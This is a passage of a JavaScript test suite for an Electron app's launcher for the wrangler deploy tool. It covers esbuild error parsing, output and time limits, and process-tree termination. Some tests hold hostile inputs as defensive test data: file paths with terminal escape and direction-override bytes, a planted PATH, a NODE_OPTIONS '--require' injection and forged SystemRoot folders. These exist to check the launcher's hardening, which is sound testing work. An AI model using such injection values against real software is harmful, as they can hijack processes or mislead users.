// A failed `deploy` or `dev` whose output is esbuild refusing a malformed tsconfig.json, jsconfig.json
// or package.json in a parent folder is reported by naming that file. The path comes from what
// esbuild printed; TalkWeaver opens no file outside the app for this.
{
  // Captured from the real toolchain (wrangler 4.144.0, esbuild 0.28.1, macOS; a dry-run deploy
  // through the launcher, which asks for no colour, with the broken file planted). The colour codes
  // are as printed all the same: wrangler formats esbuild's errors with colour whatever it is told.
  // The place line carries none, and is read exactly as printed.
  const E = '\u001b'
  const captured = (message, place, source) => `${E}[31m✘ ${E}[41;31m[${E}[41;97mERROR${E}[41;31m]${E}[0m ${E}[1mBuild failed with 1 error:${E}[0m\n\n  ${E}[31m✘ ${E}[41;31m[${E}[41;97mERROR${E}[41;31m]${E}[0m ${E}[1m${message}${E}[0m\n  \n      ${place}\n  ${E}[37m      1 │ ${source}\n          ╵   ${E}[32m~~~~${E}[0m\n  \n  \n\n\n🪵  Logs were written to "/Users/ada/Library/Application Support/TalkWeaver/wrangler-runs/home/.config/.wrangler/logs/wrangler-2026-10-07_19-57-40_746.log"\n`
  const run = '/Users/ada/Library/Application Support/TalkWeaver/wrangler-runs'
  for (const [message, place, source, expected] of [
    ['Expected string in JSON but found "this"', '../../../../tsconfig.json:1:23:', `{ "compilerOptions": { ${E}[32mthis${E}[37m is not JSON`, '/Users/ada/tsconfig.json'],
    ['Unexpected end of file in JSON', '../../../jsconfig.json:1:7:', `{ "a": ${E}[32m${E}[37m`, '/Users/ada/Library/jsconfig.json'],
    ['JSON does not support comments', '../package.json:1:2:', `{ ${E}[32m// comment${E}[37m`, '/Users/ada/Library/Application Support/TalkWeaver/package.json'],
    ['JSON does not support trailing commas', '../../../../../package.json:3:1:', '}', '/Users/package.json'],
    ['Expected end of file in JSON but found "x"', '../../../../../../tsconfig.json:1:11:', '{ "a": 1 } x', '/tsconfig.json'],
    ['JSON strings must use double quotes', '/Applications/package.json:1:2:', "{ 'a': 1 }", '/Applications/package.json'],
  ]) {
    assert.deepEqual(brokenJsonFileInOutput(`\n\n${captured(message, place, source)}`, run, 'darwin'), { path: expected }, `${place} → ${expected}`)
  }
  // A folder whose NAME contains escape bytes (captured the same way: esbuild prints them raw on the
  // place line). The path must be the real one, and what is shown must have the bytes written out.
  {
    const odd = brokenJsonFileInOutput(captured('Unexpected end of file in JSON', `../../../tmp/${E}[31mactual${E}[0m/package.json:1:10:`, `{ "name": ${E}[32m${E}[37m`), '/r/home/ud/wrangler-runs', 'darwin')
    assert.deepEqual(odd, { path: `/r/tmp/${E}[31mactual${E}[0m/package.json` }, 'the escape bytes are part of the path and are kept: this is the real file')
    assert.equal(visiblePath(odd.path), '/r/tmp/\\x1b[31mactual\\x1b[0m/package.json')
    const shown = blockingFileText(odd.path)
    assert.equal(shown, 'A file on this computer stops the live service from being prepared. Details: /r/tmp/\\x1b[31mactual\\x1b[0m/package.json: It is not valid JSON. Fix or move it, then try again.')
    assert.ok(!/[\u0000-\u001f\u007f-\u009f]/.test(shown), 'what is shown holds no control character')
    assert.equal(visiblePath('/a\nb\tc\u007f\u0085\u202e/x'), '/a\\x0ab\\x09c\\x7f\\x85\\u202e/x', 'line breaks, tabs and direction overrides are written out too')
    assert.equal(visiblePath('/Users/Ada Lovelace/Área de Trabalho/tsconfig.json'), '/Users/Ada Lovelace/Área de Trabalho/tsconfig.json', 'ordinary names are untouched')
    // A place line that BEGINS with an escape is colouring this code does not know: no guess.
    assert.equal(brokenJsonFileInOutput(captured('Unexpected end of file in JSON', `${E}[4m../../package.json:1:1:${E}[0m`, ''), '/r/home/ud/wrangler-runs', 'darwin'), null)
    assert.equal(brokenJsonFileInOutput(captured('Unexpected end of file in JSON', `${E}[4m../../package.json${E}[0m:1:1:`, ''), '/r/home/ud/wrangler-runs', 'darwin'), null)
    // The output is not rewritten before reading: a `[ERROR]` spelled with escapes inside a PATH is not an error line.
    assert.equal(brokenJsonFileInOutput(`reading ../x/[ERROR] JSON/thing\n      ../../package.json:1:1:\n`, '/r/a/b', 'darwin')?.path, '/r/package.json', 'a plain line that says [ERROR] and JSON does count (no colour needed)')
  }
  // Windows shapes (not captured: built from the same lines with the separators esbuild may print there).
  const winRun = 'C:\\Users\\Ada\\AppData\\Roaming\\TalkWeaver\\wrangler-runs'
  assert.deepEqual(brokenJsonFileInOutput(captured('Unexpected end of file in JSON', '../../../../package.json:1:1:', ''), winRun, 'win32'), { path: 'C:\\Users\\Ada\\package.json' })
  assert.deepEqual(brokenJsonFileInOutput(captured('Unexpected end of file in JSON', '..\\..\\tsconfig.json:1:1:', '').replaceAll('\n', '\r\n'), winRun, 'win32'), { path: 'C:\\Users\\Ada\\AppData\\Roaming\\tsconfig.json' })
  assert.deepEqual(brokenJsonFileInOutput(captured('JSON does not support comments', 'D:/Apps/jsconfig.json:2:3:', '// c'), winRun, 'win32'), { path: 'D:\\Apps\\jsconfig.json' })
  assert.deepEqual(brokenJsonFileInOutput(captured('JSON does not support comments', 'C:\\Users\\Ada\\AppData\\Local\\Programs\\package.json:2:3:', '// c'), winRun, 'win32'), { path: 'C:\\Users\\Ada\\AppData\\Local\\Programs\\package.json' })
  // Anything else stays the general failure.
  for (const other of [
    '', 'Authentication error [code: 10000]',
    captured('Could not resolve "./missing"', '../../../../worker/index.ts:3:21:', 'import x from "./missing"'),
    captured('Unexpected "}"', '../../../../worker/index.ts:9:1:', '}'),
    captured('Expected string in JSON but found "this"', '../../../../some-data.json:1:23:', '{ this'), // not one of the three names
    captured('Expected string in JSON but found "this"', '', ''), // no place
    '✘ [ERROR] A request to the Cloudflare API (/accounts/x/workers/scripts/y) failed.\n\n  Invalid JSON body [code: 10021]\n\n',
    'the file ../../tsconfig.json:1:2: is mentioned, but not after an esbuild JSON error',
  ]) assert.equal(brokenJsonFileInOutput(other, run, 'darwin'), null, `not recognised: ${other.replace(/\u001b\[[0-9;]*m/g, '').trim().slice(0, 60)}`)
  assert.equal(BLOCKING_FILE_MESSAGE, 'A file on this computer stops the live service from being prepared')
  assert.equal(blockingFileText('/Users/ada/tsconfig.json'), 'A file on this computer stops the live service from being prepared. Details: /Users/ada/tsconfig.json: It is not valid JSON. Fix or move it, then try again.')

  // Used where the Worker is still compiled at run time (local dev: tests and the unpackaged app), on
  // wrangler's own output. The live service's set-up compiles nothing (ticket 11), so it has nothing
  // to sort this way; and the main process has no code left that goes looking in parent folders.
  const main = readSource(join(repo, 'src/main/index.ts'))
  const body = (name) => functionBody(main, name)
  assert.equal(body('deployLiveWorker').split('liveWorkerFailureText(').length - 1, 0, 'the set-up runs no tool whose output could name a file')
  assert.equal(body('startLocalLiveWorker').split('liveWorkerFailureText(').length - 1, 2, 'and a local dev server that does not start or stops')
  assert.ok(!/parent-json-check|findBrokenParentJson|brokenParentJsonText|appInstallDir/.test(main) && !existsSync(join(repo, 'src/main/parent-json-check.ts')), 'the pre-check is gone')
}

// ── 3. Output is bounded ────────────────────────────────────────────────────────────────────────
function fakeChild(script) {
  const child = new EventEmitter()
  child.stdout = new EventEmitter()
  child.stderr = new EventEmitter()
  child.stdin = Object.assign(new EventEmitter(), { end: () => queueMicrotask(() => script(child)) })
  child.killed = []
  child.kill = (signal) => { child.killed.push(signal) }
  return child
}
{
  // More than the limit on stdout: stopped, failed, a plain message last; only the tail was kept.
  const megabyte = Buffer.alloc(1024 * 1024, 'x')
  let child
  let emitted = 0
  const run = await runWrangler(mac, ['pages', 'deploy'], { start: () => (child = fakeChild((c) => {
    c.stderr.emit('data', Buffer.from('first words on stderr'))
    for (let i = 0; i < WRANGLER_MAX_OUTPUT_BYTES / megabyte.length + 8; i++) { c.stdout.emit('data', megabyte); emitted += megabyte.length }
    c.emit('close', 0)
  })) })
  assert.ok(emitted > WRANGLER_MAX_OUTPUT_BYTES, 'the fake child printed more than the limit')
  assert.equal(run.ok, false, 'a command that prints past the limit fails, even if it then exits 0')
  assert.equal(run.outputLimitExceeded, true)
  assert.ok(run.stderr.endsWith(WRANGLER_OUTPUT_LIMIT_MESSAGE), 'the reason is the last thing in stderr, where callers read the error')
  assert.ok(run.stderr.startsWith('first words on stderr'))
  assert.deepEqual(child.killed, ['SIGKILL'], 'and the command is stopped')
  assert.ok(run.stdout.length <= WRANGLER_KEPT_OUTPUT_CHARS, 'main kept only the tail')
}
{
  // The same on stderr, with a small limit; and under the limit the tail of both streams is returned.
  const over = await runWrangler(mac, ['deploy'], { maxOutputBytes: 10, start: () => fakeChild((c) => { c.stderr.emit('data', 'twelve chars'); c.emit('close', 1) }) })
  assert.equal(over.outputLimitExceeded, true)
  const long = `${'a'.repeat(WRANGLER_KEPT_OUTPUT_CHARS)}\nPublished https://talkweaver-live.ada.workers.dev\n`
  let seenLaunch
  const under = await runWrangler(mac, ['deploy'], { set: { CLOUDFLARE_API_TOKEN: 't' }, input: 'secret-json', start: (launch) => {
    seenLaunch = { launch, cwd: launch.cwd }
    return fakeChild((c) => { c.stdout.emit('data', 'head of stdout '); c.stdout.emit('data', long); c.stderr.emit('data', 'warn'); c.emit('close', 0) })
  } })
  assert.deepEqual({ ok: under.ok, stderr: under.stderr, limit: under.outputLimitExceeded }, { ok: true, stderr: 'warn', limit: undefined })
  assert.equal(under.stdout.length, WRANGLER_KEPT_OUTPUT_CHARS)
  assert.match(under.stdout, /https:\/\/[^\s]+\.workers\.dev\b/, 'the deployed address, printed last, is in what is kept')
  assert.ok(!under.stdout.includes('head of stdout'))
  assert.equal(seenLaunch.cwd, mac.workDir)
  assert.equal(seenLaunch.launch.env.CLOUDFLARE_API_TOKEN, 't')
  const failed = await runWrangler(mac, ['deploy'], { start: () => fakeChild((c) => { c.stderr.emit('data', 'Authentication error'); c.emit('close', 1) }) })
  assert.deepEqual(failed, { ok: false, stdout: '', stderr: 'Authentication error' })
}

{
  // The time limit (ticket 04 fix round): the tool is asked to stop, then killed after the grace,
  // and the run is answered only once the process has EXITED. A caller that runs one upload after
  // another can therefore never start the next while a late one is still sending.
  assert.deepEqual([WRANGLER_TIME_LIMIT_MS, WRANGLER_KILL_GRACE_MS], [180_000, 5_000], 'three minutes, then five seconds of grace')
  // A tool that ignores the request to stop, and goes only when killed. Nothing here is timed by the
  // clock of the machine running it: each step is waited for, and the tool goes only when the test lets it.
  // (An earlier form slept 50 and 40 ms and expected the tool, due to go 100 ms in, not to have gone
  // yet: a 10 ms margin, which a Windows runner's coarser timers overran.)
  let stubborn
  let answered = false
  const reached = async (what, condition) => { for (const end = Date.now() + 10_000; Date.now() < end;) { if (condition()) return; await new Promise((resolve) => setTimeout(resolve, 2)) } assert.fail(`timed out waiting for: ${what}`) }
  const run = runWrangler(mac, ['pages', 'deploy'], { timeoutMs: 30, killGraceMs: 1500, start: () => {
    stubborn = fakeChild((c) => { c.stdout.emit('data', 'uploading… ') })
    return stubborn // its `kill` only records the signal: it goes when `close` is emitted below
  } })
  void run.then(() => { answered = true })
  await reached('the request to stop', () => stubborn.killed.length >= 1)
  assert.deepEqual([stubborn.killed, answered], [['SIGTERM'], false], 'at the limit it is asked to stop, and the run is NOT answered while it is still there')
  await reached('the kill', () => stubborn.killed.length >= 2)
  await new Promise((resolve) => setTimeout(resolve, 20))
  assert.deepEqual([stubborn.killed, answered], [['SIGTERM', 'SIGKILL'], false], 'after the grace it is killed, and still not answered until it has gone')
  stubborn.emit('close', null)
  const stopped = await run
  assert.deepEqual({ ok: stopped.ok, timedOut: stopped.timedOut, stdout: stopped.stdout }, { ok: false, timedOut: true, stdout: 'uploading… ' })
  assert.ok(stopped.stderr.endsWith(WRANGLER_TIMED_OUT_MESSAGE), 'the reason is the last thing in stderr')
  // A tool that stops when asked: no kill, and what it printed on the way out is kept.
  let polite
  const asked = await runWrangler(mac, ['deploy'], { timeoutMs: 20, killGraceMs: 500, start: () => {
    polite = fakeChild(() => {})
    polite.kill = (signal) => { polite.killed.push(signal); polite.stderr.emit('data', 'interrupted'); queueMicrotask(() => polite.emit('close', 143)) }
    return polite
  } })
  assert.deepEqual([polite.killed, asked.timedOut, asked.ok], [['SIGTERM'], true, false])
  // In time: nothing is sent, and a failure of its own is not called a time-out.
  const inTime = await runWrangler(mac, ['deploy'], { timeoutMs: 500, start: () => fakeChild((c) => { c.emit('close', 1) }) })
  assert.deepEqual([inTime.timedOut, inTime.ok], [undefined, false])
  // Windows: a signal does not reach the processes the tool started, so the whole tree is ended at the limit.
  const trees = []
  let onWindows
  const winRun = await runWrangler(windows, ['pages', 'deploy'], { timeoutMs: 20, killGraceMs: 20, killTree: (pid) => { trees.push(pid); setTimeout(() => onWindows.emit('close', 1), 10) }, start: () => {
    onWindows = Object.assign(fakeChild(() => {}), { pid: 4242 })
    return onWindows
  } })
  assert.deepEqual([trees, winRun.timedOut], [[4242], true], 'taskkill /T /F for the tool\'s process id, and the run answered once it has gone')
  const noTree = []
  let onMac
  await runWrangler(mac, ['deploy'], { timeoutMs: 10, killGraceMs: 10, killTree: (pid) => noTree.push(pid), start: () => {
    onMac = Object.assign(fakeChild(() => {}), { pid: 7 })
    onMac.kill = () => queueMicrotask(() => onMac.emit('close', null))
    return onMac
  } })
  assert.deepEqual(noTree, [], 'elsewhere the signals are enough')
}

{
  // No wait without a deadline (ticket 04 fix round 2). First with nothing real: a process that
  // never says anything, not even that it has gone, is answered at the deadline after the kill.
  const destroyed = []
  let silent
  const began = Date.now()
  const lost = await runWrangler(mac, ['pages', 'deploy'], { timeoutMs: 20, killGraceMs: 20, killDeadlineMs: 40, start: () => {
    silent = fakeChild(() => {})
    silent.stdout.destroy = () => destroyed.push('stdout')
    silent.stderr.destroy = () => destroyed.push('stderr')
    return silent
  } })
  assert.deepEqual([lost.timedOut, lost.ok, silent.killed, destroyed], [true, false, ['SIGTERM', 'SIGKILL'], ['stdout', 'stderr']], 'answered as timed out, and its output is no longer read')
  assert.ok(Date.now() - began < 1500, 'at the deadline, not later')
  assert.deepEqual([WRANGLER_KILL_DEADLINE_MS, WRANGLER_DRAIN_MS], [3_000, 2_000])
  // The process has exited but its output is held open: answered after the drain, with what it printed.
  let held
  const drained = await runWrangler(mac, ['deploy'], { drainMs: 30, start: () => (held = fakeChild((c) => { c.stdout.emit('data', 'Published'); c.emit('exit', 0) })) })
  assert.deepEqual({ ok: drained.ok, stdout: drained.stdout, timedOut: drained.timedOut }, { ok: true, stdout: 'Published', timedOut: undefined })

  // Now with REAL processes (not Windows, where the tree is ended by taskkill): a tool that starts
  // a process of its own which inherits its output and sleeps for a minute.
  if (process.platform !== 'win32') {
    const dir = mkdtempSync(join(tmpdir(), 'tw-launcher-group-'))
    const gone = async (pid) => { for (const end = Date.now() + 3000; Date.now() < end;) { try { process.kill(pid, 0) } catch { return true } await new Promise((resolve) => setTimeout(resolve, 25)) } return false }
    const script = (name, body) => { const path = join(dir, name); writeFileSync(path, `const { spawn } = require('node:child_process')\nconst inner = spawn('sleep', ['60'], { stdio: ['ignore', 'inherit', 'inherit'] })\nconsole.log(JSON.stringify({ inner: inner.pid, cwd: process.cwd(), env: process.env }))\n${body}\n`); return path }
    const real = (path, options) => runWrangler(mac, ['pages', 'deploy'], { ...options, start: (launch) => startWranglerProcess({ ...launch, command: process.execPath, args: [path], cwd: dir, env: { PATH: process.env.PATH, MADE_UP_ONLY: 'yes' } }, process.platform) })
    try {
      // (1) The tool ignores the request to stop and never exits by itself.
      const stuckAt = Date.now()
      const stuck = await real(script('stuck.cjs', "process.on('SIGTERM', () => {})\nsetInterval(() => {}, 1000)"), { timeoutMs: 400, killGraceMs: 300, killDeadlineMs: 1500 })
      const stuckSaid = JSON.parse(stuck.stdout.trim().split('\n')[0])
      assert.deepEqual([stuck.timedOut, stuck.ok], [true, false])
      assert.ok(Date.now() - stuckAt < 400 + 300 + 1500 + 1000, `answered within the deadline (${Date.now() - stuckAt} ms), although the process it started holds its output open for a minute`)
      assert.equal(await gone(stuckSaid.inner), true, 'and the process it started is gone: the signal went to the whole group')
      // `detached` changed neither the working folder nor the environment.
      assert.equal(realpathSync(stuckSaid.cwd), realpathSync(dir), 'the working folder is the launch\'s')
      assert.deepEqual(Object.keys(stuckSaid.env).filter((name) => name !== '__CF_USER_TEXT_ENCODING').sort(), ['MADE_UP_ONLY', 'PATH'], 'the environment is the launch\'s and nothing else')
      // (2) The tool exits at once, in time, leaving that process behind with its output.
      const leftAt = Date.now()
      const left = await real(script('left.cjs', 'process.exit(0)'), { drainMs: 300 })
      const leftSaid = JSON.parse(left.stdout.trim().split('\n')[0])
      assert.deepEqual([left.ok, left.timedOut], [true, undefined], 'its own result stands')
      assert.ok(Date.now() - leftAt < 5000, `answered when the tool exited (${Date.now() - leftAt} ms), not when its output closed a minute later`)
      assert.equal(await gone(leftSaid.inner), true, 'and what it left behind is gone when the run is answered')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }
  // The publishing tool must not outlive the app (ticket 04 round 3): every run under way is ended at once.
  if (process.platform !== 'win32') {
    const dir = mkdtempSync(join(tmpdir(), 'tw-launcher-quit-'))
    const gone = async (pid) => { for (const end = Date.now() + 3000; Date.now() < end;) { try { process.kill(pid, 0) } catch { return true } await new Promise((resolve) => setTimeout(resolve, 25)) } return false }
    const path = join(dir, 'long.cjs')
    writeFileSync(path, "const { spawn } = require('node:child_process')\nconst inner = spawn('sleep', ['60'], { stdio: ['ignore', 'inherit', 'inherit'] })\nconsole.log(JSON.stringify({ inner: inner.pid, self: process.pid }))\nprocess.on('SIGTERM', () => {})\nsetInterval(() => {}, 1000)\n")
    let child
    try {
      assert.equal(endAllWranglerRuns(), 0, 'with nothing under way there is nothing to end')
      const run = runWrangler(mac, ['pages', 'deploy'], { start: (launch) => (child = startWranglerProcess({ ...launch, command: process.execPath, args: [path], cwd: dir, env: { PATH: process.env.PATH } }, process.platform)) })
      const said = await new Promise((resolve) => child.stdout.once('data', (chunk) => resolve(JSON.parse(String(chunk).trim()))))
      assert.equal(said.self, child.pid, 'a long upload is under way')
      const at = Date.now()
      assert.equal(endAllWranglerRuns(), 1, 'the one run under way is ended')
      assert.ok(Date.now() - at < 500, 'at once, without waiting: it is called while the app quits')
      assert.deepEqual([await gone(said.self), await gone(said.inner)], [true, true], 'the tool and the process it started are both gone')
      const answered = await run
      assert.equal(answered.ok, false, 'and the run is answered as failed, not left pending')
      assert.equal(endAllWranglerRuns(), 0, 'a run that has been answered is no longer in the list')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }
  // The same as the app does it: in a process of its own that QUITS straight after (so nothing later
  // in that process can tidy up). Once by calling endAllWranglerRuns() and exiting, once by exiting alone
  // (the last resort: the launcher's own `exit` handler).
  if (process.platform !== 'win32') {
    const dir = mkdtempSync(join(tmpdir(), 'tw-launcher-app-quit-'))
    const gone = async (pid) => { for (const end = Date.now() + 3000; Date.now() < end;) { try { process.kill(pid, 0) } catch { return true } await new Promise((resolve) => setTimeout(resolve, 25)) } return false }
    const tool = join(dir, 'long.cjs')
    writeFileSync(tool, "const { spawn } = require('node:child_process')\nconst inner = spawn('sleep', ['60'], { stdio: ['ignore', 'inherit', 'inherit'] })\nconsole.log(JSON.stringify({ inner: inner.pid, self: process.pid }))\nprocess.on('SIGTERM', () => {})\nsetInterval(() => {}, 1000)\n")
    const app = join(dir, 'app.mjs')
    writeFileSync(app, `import { endAllWranglerRuns, runWrangler, startWranglerProcess } from ${JSON.stringify(pathToFileURL(join(repo, 'src/main/wrangler-launcher.ts')).href)}
const install = { execPath: process.execPath, appRoot: ${JSON.stringify(repo)}, platform: process.platform, workDir: ${JSON.stringify(join(dir, 'runs'))} }
let child
void runWrangler(install, ['--version'], { start: (launch) => (child = startWranglerProcess({ ...launch, command: process.execPath, args: [${JSON.stringify(tool)}], cwd: ${JSON.stringify(dir)}, env: { PATH: process.env.PATH } }, process.platform)) })
child.stdout.once('data', (chunk) => {
  process.stdout.write(String(chunk))
  if (process.argv[2] === 'call') endAllWranglerRuns()
  process.exit(0)
})
`)
    try {
      for (const how of ['call', 'exit-only']) {
        const quit = spawnSync(process.execPath, ['--disable-warning=MODULE_TYPELESS_PACKAGE_JSON', '--disable-warning=ExperimentalWarning', app, how], { encoding: 'utf8', timeout: 20_000 })
        assert.equal(quit.status, 0, `the stand-in app quit (${how}): ${quit.stderr}`)
        const said = JSON.parse(quit.stdout.trim().split('\n')[0])
        assert.deepEqual([await gone(said.self), await gone(said.inner)], [true, true], `${how}: after the app has quit, the tool and the process it started are both gone`)
      }
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }
  // A tool whose own process has EXITED while something it started lives on, holding its output open
  // (the run is not answered yet: its last output is being awaited). Quitting in that window:
  if (process.platform !== 'win32') {
    // POSIX, real processes: the GROUP is still on the list, and what the tool left behind is ended.
    const dir = mkdtempSync(join(tmpdir(), 'tw-launcher-left-'))
    const gone = async (pid) => { for (const end = Date.now() + 3000; Date.now() < end;) { try { process.kill(pid, 0) } catch { return true } await new Promise((resolve) => setTimeout(resolve, 25)) } return false }
    const tool = join(dir, 'leaves.cjs')
    writeFileSync(tool, "const { spawn } = require('node:child_process')\nconst inner = spawn('sleep', ['60'], { stdio: ['ignore', 'inherit', 'inherit'] })\nprocess.stdout.write(JSON.stringify({ inner: inner.pid }) + '\\n', () => process.exit(0))\n")
    let child
    try {
      let answered = false
      const run = runWrangler(mac, ['pages', 'deploy'], { drainMs: 30_000, start: (launch) => (child = startWranglerProcess({ ...launch, command: process.execPath, args: [tool], cwd: dir, env: { PATH: process.env.PATH } }, process.platform)) })
      void run.then(() => { answered = true })
      let printed = ''
      child.stdout.on('data', (chunk) => { printed += String(chunk) })
      await new Promise((resolve) => child.once('exit', resolve))
      await new Promise((resolve) => setTimeout(resolve, 50))
      const said = JSON.parse(printed.trim().split('\n')[0])
      assert.deepEqual([answered, await gone(child.pid)], [false, true], 'the tool itself has exited, and the run is not answered yet')
      assert.equal((() => { try { process.kill(said.inner, 0); return true } catch { return false } })(), true, 'what it started is still alive')
      assert.equal(endAllWranglerRuns(), 1, 'its group is still on the list')
      assert.equal(await gone(said.inner), true, 'and the process it left behind is gone')
      assert.equal(endAllWranglerRuns(), 0, 'once ended, it is off the list')
      await run
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }
  {
    // Which groups are signalled at quit, on every platform's runner (the signal goes through the test's seam).
    const sent = []
    const grouped = (script) => Object.assign(fakeChild(script), { pid: 1073741822, group: true })
    const start = (script) => { let child; const run = runWrangler(mac, ['pages', 'deploy'], { drainMs: 400, signalGroup: (pid, signal) => sent.push([pid, signal]), start: () => (child = grouped(script)) }); return { run, child: () => child } }
    const tick = () => new Promise((resolve) => setTimeout(resolve, 20))
    // (1) The tool is running: its group is signalled.
    const running = start(() => {})
    await tick()
    assert.deepEqual([endAllWranglerRuns(), sent.splice(0)], [1, [[1073741822, 'SIGKILL']]], 'a tool that is running: its group is ended')
    running.child().emit('close', null)
    await running.run
    sent.splice(0)
    // (2) The tool has exited and its output is still open: something of its group is alive, so the group id is still its own.
    const holding = start((c) => { c.emit('exit', 0) })
    await tick()
    assert.deepEqual([endAllWranglerRuns(), sent.splice(0)], [1, [[1073741822, 'SIGKILL']]], 'exited, output still open: its group is ended')
    await holding.run
    sent.splice(0)
    // (3) The tool has exited and BOTH its outputs have closed: nothing proves the group id is still its own. Nothing is sent.
    const closed = start((c) => { c.emit('exit', 0); c.stdout.emit('close'); c.stderr.emit('close') })
    await tick()
    assert.deepEqual([endAllWranglerRuns(), sent.splice(0), closed.child().killed], [0, [], []], 'exited, both outputs closed: nothing is sent to that group number, or to the tool')
    await closed.run
    assert.deepEqual(sent, [], 'nor when the run is then answered')
    // (3b) One output closed is not both.
    const half = start((c) => { c.emit('exit', 0); c.stdout.emit('close') })
    await tick()
    assert.deepEqual([endAllWranglerRuns(), sent.splice(0)], [1, [[1073741822, 'SIGKILL']]])
    await half.run
    const header = readSource(join(repo, 'src/main/wrangler-launcher.ts')).split('\nimport ')[0].replace(/\n\/\/ ?/g, ' ')
    assert.ok(header.includes('A helper that outlives the tool and has closed the output it inherited is not ended at quit.'), 'the limit is written in the launcher\'s header')
  }
  {
    // Not a group (and so on Windows): a process id that has exited may already be another program's.
    // Nothing is sent to it, by signal or by taskkill.
    const trees = []
    let finished
    const draining = runWrangler(windows, ['pages', 'deploy'], { drainMs: 300, killTree: (pid) => trees.push(pid), start: () => (finished = Object.assign(fakeChild((c) => { c.stdout.emit('data', 'Published'); c.emit('exit', 0) }), { pid: 4242 })) })
    await new Promise((resolve) => setTimeout(resolve, 30))
    assert.deepEqual([endAllWranglerRuns(), finished.killed, trees], [0, [], []], 'Windows, the tool has exited: no taskkill for its process id, and no signal')
    assert.deepEqual({ ok: (await draining).ok, killed: finished.killed, trees }, { ok: true, killed: [], trees: [] }, 'and the run is answered with its own result')
    // One still running IS ended: on Windows by the tree kill for its process id.
    let running
    const live = runWrangler(windows, ['pages', 'deploy'], { killTree: (pid) => { trees.push(pid); queueMicrotask(() => running.emit('exit', null)) }, start: () => (running = Object.assign(fakeChild(() => {}), { pid: 4243 })) })
    await new Promise((resolve) => setTimeout(resolve, 10))
    assert.deepEqual([endAllWranglerRuns(), trees], [1, [4243]], 'Windows, the tool is running: the tree kill, for its own process id')
    await live
    // And where it is neither a group nor Windows (a test's stand-in): the tool itself is killed only while it runs.
    let plain
    const plainRun = runWrangler(mac, ['deploy'], { start: () => (plain = Object.assign(fakeChild(() => {}), { pid: 4244 })) })
    await new Promise((resolve) => setTimeout(resolve, 10))
    plain.kill = (signal) => { plain.killed.push(signal); queueMicrotask(() => plain.emit('exit', null)) }
    assert.deepEqual([endAllWranglerRuns(), plain.killed], [1, ['SIGKILL']])
    await plainRun
    // The default tree kill at quit is the absolute taskkill, run to its end.
    assert.ok(/const kill = taskkillCommand\(run\.install, run\.inherited, pid\)\s+spawnSync\(kill\.command, kill\.args, \{ \.\.\.kill\.options, timeout: 5_000 \}\)/.test(readSource(join(repo, 'src/main/wrangler-launcher.ts'))))
    const header = readSource(join(repo, 'src/main/wrangler-launcher.ts')).split('\nimport ')[0].replace(/\n\/\/ ?/g, ' ')
    assert.ok(header.includes('On Windows a helper process that outlives the publishing tool\'s own process is not ended when TalkWeaver quits.'), 'the limit is written in the launcher\'s header')
  }
  {
    // A run that ended by itself is not in the list either.
    await runWrangler(mac, ['deploy'], { start: () => fakeChild((c) => { c.emit('close', 0) }) })
    assert.equal(endAllWranglerRuns(), 0)
    // Windows: the tree is ended by taskkill, by its absolute path inside the CHECKED Windows folder,
    // started in that folder, with the launcher's own environment and nothing the call set, and no shell.
    const exists = (path) => ['C:\\Windows\\System32\\kernel32.dll', 'C:\\Windows\\System32\\cmd.exe', 'D:\\WinNT\\System32\\kernel32.dll', 'D:\\WinNT\\System32\\cmd.exe'].includes(path)
    const win = { ...windows, exists }
    const kill = taskkillCommand(win, { SystemRoot: 'D:\\WinNT', PATH: 'C:\\planted;C:\\Windows\\System32', CLOUDFLARE_API_TOKEN: 'made-up-token-never-passed', NODE_OPTIONS: '--require x' }, 4242)
    assert.deepEqual([kill.command, kill.args, kill.options.cwd, kill.options.shell, kill.options.stdio], ['D:\\WinNT\\System32\\taskkill.exe', ['/pid', '4242', '/T', '/F'], 'D:\\WinNT\\System32', false, 'ignore'])
    assert.deepEqual(kill.options.env, wranglerChildEnv(win, { inherited: { SystemRoot: 'D:\\WinNT' } }), 'its environment is the launcher\'s allowlisted one')
    assert.ok(!JSON.stringify(kill.options.env).includes('planted') && !JSON.stringify(kill.options.env).includes('made-up-token') && !('NODE_OPTIONS' in kill.options.env), 'no inherited PATH, no credential, no Node option reaches it')
    // A SystemRoot that is not a real Windows folder (planted, relative, or with ..) is not used.
    for (const root of ['C:\\planted', 'planted', 'C:\\Windows\\..\\planted', '\\\\server\\share', undefined]) {
      assert.equal(taskkillCommand(win, root === undefined ? {} : { SystemRoot: root }, 7).command, 'C:\\Windows\\System32\\taskkill.exe', `SystemRoot=${root}: the default Windows folder`)
    }
    // The default tree kill starts exactly that command; no bare `taskkill` is left anywhere in the main process.
    const source = readSource(join(repo, 'src/main/wrangler-launcher.ts'))
    assert.ok(/const kill = taskkillCommand\(install, options\.inherited \?\? \{\}, pid\)\s+spawn\(kill\.command, kill\.args, kill\.options\)/.test(source) && /spawnSync\(kill\.command, kill\.args, \{ \.\.\.kill\.options, timeout: 5_000 \}\)/.test(source))
    const mainFiles = readdirSync(join(repo, 'src', 'main'), { recursive: true }).map((name) => join(repo, 'src', 'main', String(name))).filter((path) => /\.(?:ts|mts|mjs)$/.test(path))
    assert.ok(mainFiles.length > 20)
    for (const file of mainFiles) {
      assert.ok(!/(?:spawn|spawnSync|exec|execSync|execFile|execFileSync)\(\s*['"`]taskkill/.test(readSource(file)), `${relative(repo, file)} starts no taskkill by bare name`)
    }
    assert.ok(/endAllWranglerRuns\(\)\n\}\)/.test(readSource(join(repo, 'src/main/index.ts'))), 'the app ends the runs under way when it quits')
  }
  // The default start is that same function, with the launch as it was resolved.
  const launcher = readSource(join(repo, 'src/main/wrangler-launcher.ts'))
  assert.ok(launcher.includes('return startWranglerProcess(launch, install.platform)') && /spawn\(launch\.command, launch\.args, \{ cwd: launch\.cwd, env: launch\.env, stdio: \['pipe', 'pipe', 'pipe'\], windowsHide: true, detached: grouped \}\)/.test(launcher), 'the tool is started with the launch\'s own environment and folder, in a group of its own')
}

// The live Worker is deployed from a generated config OUTSIDE the app's folder (wrangler writes its
// scratch beside the config): `main` points back into the shipped Worker by absolute path.
{
  const shipped = readFileSync(join(repo, 'worker/wrangler.jsonc'), 'utf8')
  const plain = liveWorkerDeployConfig(shipped, '/Applications/TalkWeaver.app/Contents/Resources/worker', null, 'darwin')
  assert.equal(plain.main, '/Applications/TalkWeaver.app/Contents/Resources/worker/index.ts')
